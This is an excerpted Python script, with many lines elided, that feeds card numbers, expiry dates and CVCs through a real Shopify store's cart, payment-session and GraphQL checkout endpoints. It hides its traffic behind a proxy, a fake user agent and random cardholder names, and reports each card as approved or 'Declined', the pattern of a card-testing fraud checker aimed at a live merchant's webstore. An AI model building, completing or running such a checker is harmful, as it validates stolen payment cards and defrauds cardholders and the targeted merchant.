import aiohttp, re, json, time, asyncio, random, os
from fake_useragent import UserAgent
from dotenv import load_dotenv
load_dotenv()

PROX = os.getenv("PROXY")
...
"""
    ...
    if len(yy) == 4 and yy.startswith("20"):
        ...
        return f"""Card: {message}
Status: Declined!❌
Response: Invalid year format. Please provide a valid year in 2 or 4 digit format.
...
async def sh(message):
    ...
    async with aiohttp.ClientSession() as r:
        url = "https://nar-anon-webstore.myshopify.com/cart/add.js"
        headers = {
        ...
        async with r.post(url, headers=headers, data=data, proxy=PROX) as response:
            text = await response.text()
            
            if response.status != 200:
                return f"""Card: {message}
Status: Declined!❌
Response: Failded to add to cart. Status code: {response.status}
...
"""
        ...
        async with r.get('https://nar-anon-webstore.myshopify.com/cart.js', headers=headers, proxy=PROX) as response:
            ...
            try:
                ...
                return f"""Card: {message}
Status: Declined!❌
Response: Failed to parse JSON response from cart.js
...
"""
        ...
        response = await r.post(
            'https://nar-anon-webstore.myshopify.com/cart',
            headers=headers,
            data=data,
        ...
        json_data = {
            'credit_card': {
                ...
                'month': result['mm'],
                'year': result['yy'],
                'verification_value': result['cvc'],
                'start_month': None,
                'start_year': None,
                'issue_number': '',
                'name': f'{rfirst} {rlast}',
            },
            'payment_session_scope': 'nar-anon-webstore.myshopify.com',
        }
        async with r.post('https://checkout.pci.shopifyinc.com/sessions', headers=headers, json=json_data, proxy=PROX) as response:
            try:
                sid = (await response.json())['id']
            except:
                return f"""Card: {message}
Status: Declined!❌
Response: Failed to retrieve session ID from payment session response.
...
"""
        ...
        headers = {
            ...
            'x-checkout-web-build-id': '1d0c610c03bb9f8946bd81fca345c682286ec9cc',
        ...
        json_data = {
            ...
            'variables': {
                        ...
                        'merchandiseLines': [
                            {
                                ...
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': 'gid://shopify/ProductVariantMerchandise/321073005',
                                        'variantId': 'gid://shopify/ProductVariant/321073005',
                                        'properties': [],
                                        'sellingPlanId': None,
                ...
                'metafields': [],
                'analytics': {
                    'requestUrl': f'https://nar-anon-webstore.myshopify.com/checkouts/cn/{tok}',
                    'pageId': '576d0a80-1D06-40A6-C2D9-81C107C7AB53',
                },
            },
            'operationName': 'SubmitForCompletion',
        }

        async with r.post('https://nar-anon-webstore.myshopify.com/checkouts/unstable/graphql', params=params, headers=headers, json=json_data, proxy=PROX) as response:
            raw = await response.text()
            try:
                res_json = json.loads(raw)
                
                receipt = res_json.get('data', {}).get('submitForCompletion', {}).get('receipt')
                if receipt and 'id' in receipt:
                    rid = receipt['id']
                else:
                    errors = res_json.get('data', {}).get('submitForCompletion', {}).get('errors', [])
                    if errors:
...
"""
            ...
            for _ in range(max_retries):
                async with r.post('https://nar-anon-webstore.myshopify.com/checkouts/unstable/graphql',params=params,headers=headers,json=json_data, proxy=PROX) as final_response:
